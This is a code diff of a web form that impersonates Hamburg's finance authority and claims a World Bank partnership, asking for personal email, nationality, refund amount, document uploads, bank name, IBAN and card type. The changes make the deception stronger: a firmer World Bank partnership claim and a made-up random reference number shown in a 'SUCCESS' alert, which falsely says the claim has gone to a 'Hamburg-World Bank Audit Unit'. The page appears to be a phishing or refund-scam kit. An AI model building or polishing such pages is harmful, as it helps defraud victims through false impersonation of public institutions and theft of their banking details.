@@ -18,14 +18,13 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            /* HD IMAGE NG HAMBURG RATHAUS (CITY HALL) */
-            background-image: linear-gradient(rgba(0, 48, 99, 0.6), rgba(0, 48, 99, 0.6)), 
-                              url('https://wikimedia.org');
+            /* HD BACKGROUND NG HAMBURG RATHAUS CENTER */
+            background: linear-gradient(rgba(0, 48, 99, 0.7), rgba(0, 48, 99, 0.7)), 
+                        url('https://wikimedia.org');
             background-size: cover;
             background-position: center;
             background-attachment: fixed;
-            background-repeat: no-repeat;
-            background-color: var(--hamburg-blue); /* Backup color kung mabagal ang net */
+            background-color: var(--hamburg-blue);
             color: #333;
         }
 
@@ -40,11 +39,11 @@
             box-shadow: 0 30px 60px rgba(0,0,0,0.6); 
             overflow: hidden; 
             border-top: 10px solid var(--hamburg-red);
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(5px);
         }
         
         .header { padding: 45px 30px; text-align: center; background: white; border-bottom: 5px solid var(--hamburg-blue); }
-        .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 24px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
+        .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 24px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; }
         .header p { margin: 10px 0 0; color: var(--hamburg-red); font-weight: 700; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; }
         
         .section-box { padding: 40px; display: none; }
@@ -60,13 +59,13 @@
         input.error { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
         
         .btn-container { display: flex; justify-content: space-between; margin-top: 40px; }
-        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 18px 50px; cursor: pointer; font-size: 13px; font-weight: 800; text-transform: uppercase; border-radius: 4px; transition: 0.3s; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 18px 50px; cursor: pointer; font-size: 13px; font-weight: 800; text-transform: uppercase; border-radius: 4px; transition: 0.3s; }
         button:hover { background-color: var(--hamburg-red); transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,0,0,0.4); }
 
         #loader { display: none; border: 6px solid #f3f3f3; border-top: 6px solid var(--hamburg-blue); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .footer { font-size: 10px; color: #555; text-align: center; padding: 30px; background: rgba(255,255,255,0.9); border-top: 1px solid #eee; line-height: 1.5; }
+        .footer { font-size: 10px; color: #555; text-align: center; padding: 30px; background: rgba(255,255,255,0.9); border-top: 1px solid #eee; }
     </style>
 </head>
 <body>
@@ -97,7 +96,7 @@
                 </div>
 
                 <div class="grid-2">
-                    <div class="input-group"><label>Official Email *</label><input type="email" class="required"></div>
+                    <div class="input-group"><label>Personal Email Address *</label><input type="email" class="required"></div>
                     <div class="input-group"><label>Nationality *</label><input type="text" class="required"></div>
                 </div>
 
@@ -121,9 +120,9 @@
                 <h2>Section 2: Claim & Disbursement</h2>
                 <div class="grid-2">
                     <div class="input-group"><label>Refund Amount (EUR) *</label><input type="number" class="required" placeholder="€ 0.00"></div>
-                    <div class="input-group"><label>Upload Proof of Claim *</label><input type="file" class="required" multiple></div>
+                    <div class="input-group"><label>Upload Official Proof *</label><input type="file" class="required" multiple></div>
                 </div>
-                <div class="input-group"><label>Bank Institution Name *</label><input type="text" class="required"></div>
+                <div class="input-group"><label>Banking Institution Name *</label><input type="text" class="required"></div>
                 <div class="grid-2">
                     <div class="input-group"><label>Account Number / IBAN *</label><input type="text" class="required"></div>
                     <div class="input-group"><label>Card Classification *</label><select class="required"><option value="">Choose...</option><option>Euro Debit Card</option><option>Global Credit Card</option></select></div>
@@ -137,7 +136,7 @@
         </form>
         <div class="footer">
             © 2024 Behörde für Finanzen • Hamburg, Germany <br> 
-            In operational cooperation with the World Bank Group Development Fund.
+            Strategic Operational Partner of the World Bank Group.
         </div>
     </div>
 
@@ -155,7 +154,11 @@
         if(valid) {
             document.getElementById('submitBtn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            setTimeout(() => { alert('OFFICIAL SUCCESS: Your claim has been transmitted to the Hamburg-World Bank Audit Unit.'); location.reload(); }, 3500);
+            setTimeout(() => { 
+                const refNum = 'WB-HAM-' + Math.floor(100000 + Math.random() * 900000);
+                alert('SUCCESS!\n\nReference Number: ' + refNum + '\nYour claim has been transmitted to the Hamburg-World Bank Audit Unit.'); 
+                location.reload(); 
+            }, 3500);
         }
     }
     function prevSection() { document.getElementById('section2').classList.remove('active'); document.getElementById('section1').classList.add('active'); }
